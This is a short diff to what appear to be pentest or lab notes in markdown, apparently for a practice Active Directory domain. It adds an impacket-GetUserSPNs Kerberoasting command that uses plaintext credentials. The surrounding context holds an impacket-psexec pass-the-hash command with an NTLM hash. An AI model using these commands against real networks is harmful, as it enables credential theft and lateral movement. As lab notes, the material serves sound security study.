@@ -53,3 +53,7 @@ proxychains -q impacket-psexec -hashes
 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
 ```
 
+```
+ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -no-pass -request
+```
+
